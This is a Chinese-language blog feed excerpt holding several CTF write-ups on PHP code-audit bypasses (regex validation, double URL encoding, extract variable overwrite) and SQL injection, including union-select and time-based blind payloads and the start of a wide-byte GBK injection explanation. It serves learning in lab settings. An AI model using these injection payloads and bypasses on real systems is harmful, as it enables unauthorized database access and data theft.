class="overlay"></div>                    <img src="/img/dvwa-sql/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆数据</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      dvwa-sql
    
    </summary>
    
      <category term="dvwa-sql" scheme="https://Foxgrin.github.io/categories/dvwa-sql/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>数字验证正则绕过</title>
    <link href="https://Foxgrin.github.io//posts/25617/"/>
    <id>https://Foxgrin.github.io//posts/25617/</id>
    <published>2018-07-10T12:39:00.000Z</published>
    <updated>2018-07-10T13:28:30.327Z</updated>
    
    <content type="html"><![CDATA[<p>Bugkuctf题库中的一道代码审计题,通过利用各种正则匹配函数特性最终得到flag<a id="more"></a></p><p>源代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">if (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;])</span><br><span class="line">&#123;</span><br><span class="line">$password = $_POST[&apos;password&apos;];</span><br><span class="line">if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) //preg_match — 执行一个正则表达式匹配</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;flag&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">while (TRUE)</span><br><span class="line">&#123;</span><br><span class="line">$reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">break;</span><br><span class="line">$c = 0;</span><br><span class="line">$ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><br><span class="line">foreach ($ps as $pt)</span><br><span class="line">&#123;</span><br><span class="line">if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))</span><br><span class="line">$c += 1;</span><br><span class="line">&#125;</span><br><span class="line">if ($c &lt; 3) break;</span><br><span class="line">//&gt;=3，必须包含四种类型三种与三种以上</span><br><span class="line">if (&quot;42&quot; == $password) echo $flag;</span><br><span class="line">else echo &apos;Wrong password&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>请求方法必须为POST</p><p>首先弄明白正则匹配函数：</p><p>preg_match：执行一个正则表达式匹配，匹配到则返回1，匹配不到则返回0</p><p>preg_match_all:执行一个全局正则表达式匹配，返回成功模式匹配的次数，并将匹配结果存储到一个数组中</p><p>两个函数的区别是preg_match第一次匹配成功后就停止匹配，而preg_match_all是匹配到字符串结束为止</p><p>再弄明白几个正则匹配的特殊字符：</p><p>[:graph:] : 除空格，TAB外的所有字符<br>[:punct:] : 任何标点符号<br>[:digit:] : 任何数字<br>[:upper:] : 任何大写字母<br>[:lower:] : 任何小写字母</p><p>接下来来到第一个判断地方： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) //preg_match — 执行一个正则表达式匹配</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;flag&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果这个if语句执行成功，那么我们就获取不到后面的flag值，所以不能让if执行，也就是preg_match必须返回1，即正则匹配成功</p><p>在看正则表达式’/^[[:graph:]]{12,}$/’</p><p>必须以任意一个除空格，TAB外的标点符号开头和结尾，且出现至少12次</p><p>验证如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">    $password=$_GET[&apos;password&apos;];</span><br><span class="line">    $a=preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;,$password);</span><br><span class="line">    echo &apos;$a=&apos;.$a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输入12个1，看到结果返回1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入小于12个，看到结果返回0</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里需要注意，输入’+’ 会被当做是空格处理，要先将’+’进行URL编码%2b </p><p><img src="/img/数字验证正则绕过/3.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>综上，第一个输入要求，输入除空格,TAB外的字符至少十二次</p><p>在看下一个判断条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">break;</span><br></pre></td></tr></table></figure><p>如果if语句成功执行，break退出循环，我们就得不到flag值</p><p>所以我们不能让if语句成功执行，也就是说要让全局匹配成功次数大于6次</p><p>在看正则表达式’/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/’</p><p>因为是全局匹配，所以匹配成功的条件是检测到任何符号出现1次以上或者任何数字出现1次以上或者任何大写字母出现1次以上或者任何小写字母出现1次以上，一旦匹配成功一次，就开始检测下一次的匹配，这么说有点难理解，直接上代码验证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">    $password=$_GET[&apos;password&apos;];</span><br><span class="line">    $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">    $a=preg_match_all($reg,$password,$arr);</span><br><span class="line">    echo &apos;$a=&apos;.$a.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    print_r($arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里输入1aB.</p><p>匹配的过程是这样的:先检测到1，符合[:digit:]出现1次，继续检测，检测到a，符合[:lower:]出现1次，继续检测，以此类推，所以最后检测成功次数为4</p><p>同时也可以看出返回的数组有两个元素，第一个元素是整个匹配结果，第二个元素是子模式的匹配结果 </p><p>关于返回数组的详情可以参考：<a href="https://blog.csdn.net/qq_27988539/article/details/77366329" target="_blank" rel="noopener">https://blog.csdn.net/qq_27988539/article/details/77366329</a> </p><p>这题因为不牵涉到数组，就不详细研究</p><p>重点关注成功匹配的次数</p><p>这里特别说明什么时候是一次匹配的结束，就是检测到不是属于同一种特殊字符为止，因为这里每种特殊字符可以出现1次或者多次，举个例子，我们输入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>第一次匹配结束是检测到a字符，不符合[:digit:]，所以开始第二次匹配</p><p>因为这里要成功匹配6次以上，所以每种类型的字符必须间隔出现6次以上，结合第一个条件，字符出现12个以上，于是我们可以输入11aaBB..22cc</p><p>验证一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">    $password=$_GET[&apos;password&apos;];</span><br><span class="line">    if(0&gt;=preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;,$password))&#123;</span><br><span class="line">        echo &apos;Wrong Format 1&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">    if(6&gt;preg_match_all($reg,$password,$arr))&#123;</span><br><span class="line">        echo &apos;Wrong Format 2&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;success&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再来看第三个条件： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$c = 0;</span><br><span class="line">$ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><br><span class="line">foreach ($ps as $pt)</span><br><span class="line">&#123;</span><br><span class="line">if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))</span><br><span class="line">$c += 1;</span><br><span class="line">&#125;</span><br><span class="line">if ($c &lt; 3) break;</span><br></pre></td></tr></table></figure><p>如果$c&lt;3，那么我们就得不到flag值，也就是说要让$c&gt;=3，即成功匹配三次或以上</p><p>即出现三种类型字符或以上，按上面的输入：11aaBB..22cc，就行了，验证一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">    $password=$_GET[&apos;password&apos;];</span><br><span class="line">    if(0&gt;=preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;,$password))&#123;</span><br><span class="line">        echo &apos;Wrong Format 1&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">    if(6&gt;preg_match_all($reg,$password,$arr))&#123;</span><br><span class="line">        echo &apos;Wrong Format 2&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $c=0;</span><br><span class="line">    $ps=array(&apos;punct&apos;,&apos;digit&apos;,&apos;upper&apos;,&apos;lower&apos;);</span><br><span class="line">    foreach($ps as $pt)&#123;</span><br><span class="line">        if(preg_match(&quot;/[[:$pt:]]+/&quot;,$password))&#123;</span><br><span class="line">            $c += 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if($c&lt;3)&#123;</span><br><span class="line">        echo &apos;Wrong Format 3&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;success&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再看最后一个关键条件： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(&quot;42&quot; == $password) echo $flag;</span><br></pre></td></tr></table></figure><p>执行了这个语句我们才可以得到想要的flag，也就是password值等于’42’，因为类型都是字符串，所以password中的值必须等于42，结合上面的三个条件</p><p>成功的输入可以有：</p><p>42.000e%2b000000000</p><p>420.000000000000e-1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="php" scheme="https://Foxgrin.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>url二次编码绕过</title>
    <link href="https://Foxgrin.github.io//posts/9338/"/>
    <id>https://Foxgrin.github.io//posts/9338/</id>
    <published>2018-07-10T12:10:00.000Z</published>
    <updated>2018-07-10T12:17:46.498Z</updated>
    
    <content type="html"><![CDATA[<p>Bugkuctf题库中的一道代码审计题，通过url二次编码绕过过滤得到flag<a id="more"></a></p><p>源代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag=<span class="string">'flag&#123;xxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/hackerDJ/"</span>,$_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"not allowed"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$id=urldecode($id);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"hackerDJ"</span> == $id)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看代码第一感觉将hackerDJ进行一次URL编码即可绕过过滤 </p><p><img src="/img/url二次编码绕过/1.png" alt=""></p><p>将一次编码后的值输入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/url二次编码绕过/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现自动转化成了hackerDJ，为什么呢，因为我们提交id值给服务器时，服务器会对id值自动url解码，所以要对hackerDJ进行二次URL编码才可以绕过 </p><p><img src="/img/url二次编码绕过/3.png" alt=""></p><p>输入二次编码后的值</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/url二次编码绕过/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功得到flag值</p>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="php" scheme="https://Foxgrin.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>extract变量覆盖</title>
    <link href="https://Foxgrin.github.io//posts/25619/"/>
    <id>https://Foxgrin.github.io//posts/25619/</id>
    <published>2018-07-10T11:37:00.000Z</published>
    <updated>2018-07-10T12:04:55.616Z</updated>
    
    <content type="html"><![CDATA[<p>Bugkuctf题库中的一道代码审计题，通过巧妙利用file_get_contents函数特性来绕过extract变量覆盖<a id="more"></a></p><p>源代码如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag=&apos;../readme.txt&apos;;</span><br><span class="line"></span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($shiyan))&#123;</span><br><span class="line">    @$content=trim(file_get_contents($flag));</span><br><span class="line">    if($shiyan == $content)&#123;</span><br><span class="line">        echo &apos;flag&#123;xxx&#125;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &apos;oh,no&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>首先先弄明白几个函数：</p><p>extract:该函数将数组的键名作为变量名，键名对应的键值作为对应的变量值，返回值为设置成功的变量个数</p><p>也就是说这里的extract($_GET)将我们GET的参数名作为变量名，参数值作为变量值</p><p>例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;shiyan&apos;]) $$ isset($_GET[&apos;flag&apos;]))&#123;</span><br><span class="line">    $a=extract($_GET);</span><br><span class="line">    echo &apos;$a:&apos;.$a;</span><br><span class="line">    echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;$shiyan:&apos;.$shiyan;</span><br><span class="line">    echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;$flag:&apos;.$flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/extract变量覆盖/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功设置了两个变量，$shiyan和$flag，所以$a=2</p><p>file_get_contents：将文件内容作为字符串输出 </p><p>例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag=&apos;../readme.txt&apos;;</span><br><span class="line">$content=file_get_contents($flag);</span><br><span class="line">echo $content;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/extract变量覆盖/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里注意file_get_contents函数里的参数是$flag，也就是说我们GET进来的参数flag值会将之前的flag值覆盖掉，从而造成变量覆盖，而我们输入的flag值如果不为文件名，函数执行错误，$content会被赋值为空 </p><p>例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag=&apos;../readme.txt&apos;;</span><br><span class="line">if(isset($_GET[&apos;flag&apos;]))&#123;</span><br><span class="line">    extract($_GET);</span><br><span class="line">    @$content=file_get_contents($flag);</span><br><span class="line">    echo $content.&apos;1&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/extract变量覆盖/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>要得到最终要的flag，就必须要让变量content值等于变量shiyan的值</p><p>所以我们可以让shiyan值也为空，这样flag值任意输入，只要不为文件名，就一定相等</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/extract变量覆盖/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>另外，即使shiyan值为空，isset($shiyan)也是返回true的 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$shiyan=&quot;&quot;;</span><br><span class="line">if(isset($shiyan))&#123;</span><br><span class="line">    echo &quot;11&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/extract变量覆盖/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="php" scheme="https://Foxgrin.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Bugkuctf-sql注入2</title>
    <link href="https://Foxgrin.github.io//posts/15184/"/>
    <id>https://Foxgrin.github.io//posts/15184/</id>
    <published>2018-07-10T11:19:00.000Z</published>
    <updated>2018-07-10T12:25:05.822Z</updated>
    
    <content type="html"><![CDATA[<p>Bugkuctf题库中的sql注入类题<a id="more"></a></p><p>今天继续做web类的题 </p><p><img src="/img/bugkuctf-sql2/1.png" alt=""></p><p>从题目给出的一段代码，查询各个函数的作用</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql2/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql2/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql2/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出，这段PHP程序过滤了数组里的关键字，且对我们输入的id的值进行了标签的剥离。一开始还不懂什么意思，没事我们来试一下就慢慢懂了</p><p>跟个注入题一样，输入id值为0,1时有返回值，其他无返回值</p><p>试试id=1’,id=1”,id=1’),id=1”)发现都未返回报错信息</p><p>就用基于时间的盲注试一下</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql2/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>咦，这时候居然爆出了这么一段话，再回头看看之前查询的函数，原来我们输入的id值中包含了数组中的敏感关键字，所以爆出了这段话，再看看strip_tags()这个函数，它能剥离输入字符串中的html标签，那我们试试，在敏感关键字中的出现位置加入&lt;&gt;标签 </p><p><img src="/img/bugkuctf-sql2/6.png" alt=""></p><p>果然就没有爆出之前的那段话了，又因为网页没有睡5秒，所以再试试id=1 </p><p><img src="/img/bugkuctf-sql2/7.png" alt=""></p><p>发现程序睡了5秒，说明没有对输入的id的值进行单引号或者双引号的包裹</p><p>再查查输出的列数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql2/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现返回两列，于是接下来就是熟悉的注入 </p><p><img src="/img/bugkuctf-sql2/9.png" alt=""></p><p>爆出当前使用的数据库为sql3 </p><p><img src="/img/bugkuctf-sql2/10.png" alt=""></p><p>爆出它的数据表 </p><p><img src="/img/bugkuctf-sql2/11.png" alt=""></p><p>根据题目提示爆出id=1的hash字段值 </p>]]></content>
    
    <summary type="html">
    
      Bugkuctf-sql
    
    </summary>
    
      <category term="Bugkuctf-sql" scheme="https://Foxgrin.github.io/categories/Bugkuctf-sql/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>Bugkuctf-sql注入1</title>
    <link href="https://Foxgrin.github.io//posts/14864/"/>
    <id>https://Foxgrin.github.io//posts/14864/</id>
    <published>2018-07-10T11:10:00.000Z</published>
    <updated>2018-07-10T12:25:11.257Z</updated>
    
    <content type="html"><![CDATA[<p>Bugkuctf题库中的sql注入类题<a id="more"></a></p><p>今天试着开始做一些ctf的题目，因为最近刚好在学渗透，所以试着做了一下web类，做到一题sql注入题，按照之前学习的盲注方法，一开始先用/?id=1 </p><p><img src="/img/bugkuctf-sql1/1.png" alt=""></p><p>紧接着再试着改变id的值，发现除了0,1返回结果都为空，就判断id为注入的变量</p><p>感觉节奏很好，便在/?id=1后面加了’，结果按照之前的经验会报错，然而这题的结果却是与之前没加引号的结果相同</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql1/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在试着用 /?id=2’ union select 1,database() %23按照之前的经验会注出数据库的名字 </p><p><img src="/img/bugkuctf-sql1/3.png" alt=""></p><p>然而结果依然为空…</p><p>/?id=1’ and if(0&gt;1,1,sleep(5)) %23 会让程序睡5秒</p><p>然而结果并没有</p><p>通过查阅发现，原来这是一个有防御的php程序，使用了一个addslashed()函数，这个函数的作用是对用户输入的预定义字符前面加入转义字符‘\’进行转义</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql1/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>执行这个php程序 </p><p><img src="/img/bugkuctf-sql1/5.png" alt=""></p><p>可见当我们输入’后，经过addslashed()函数将’转化成\’，就不再是一个单引号，从而避免了一般的注入，所以便产生了宽字节注入，其原理是当mysql使用gbk编码方式时，会将前两个字符看成一个汉字（当第一个字符ascii码大于128时（比如$df），才会达到汉字的范围），当我们输入单引号’时，mysql会调用转义函数将单引号变为\’，其中\的十六进制是%5c，mysql的GBK编码，会认为%df%5c是一个宽字节，也就是’ 